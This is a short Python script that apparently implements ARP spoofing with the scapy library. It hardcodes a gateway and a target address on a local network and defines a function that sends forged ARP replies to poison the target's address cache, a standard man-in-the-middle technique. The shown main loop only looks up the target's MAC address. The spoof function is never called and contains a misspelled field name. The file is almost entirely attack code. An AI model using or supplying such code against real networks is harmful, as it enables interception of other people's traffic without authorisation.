import scapy.all as scapy


gataway_ip = "10.0.0.138"
target_ip = "10.0.0.16"

def spoof(target_ip,target_mac, spoof_ip):
    spoofed_arp_packet = scapy.ARP(pdst=target_ip,hwds = target_mac, psrc = spoof_ip,op= "is-at")
    scapy.send(spoofed_arp_packet)


def get_mac(ip):
    arp_request = scapy.Ether(dst="ff:ff:ff:ff:ff:ff") / scapy.ARP(pdst=ip)
    reply,IDC = scapy.srp(arp_request,timeout = 3)
    if reply:
        return reply[0][1].src
    return None


target_mac = None
while not target_mac:
    target_mac = get_mac(target_ip)
    if not target_mac:
        print("MAC ADD NOT FOUND, YET!")

print("TARGET MAC ADD FOUND:{}".format(target_mac))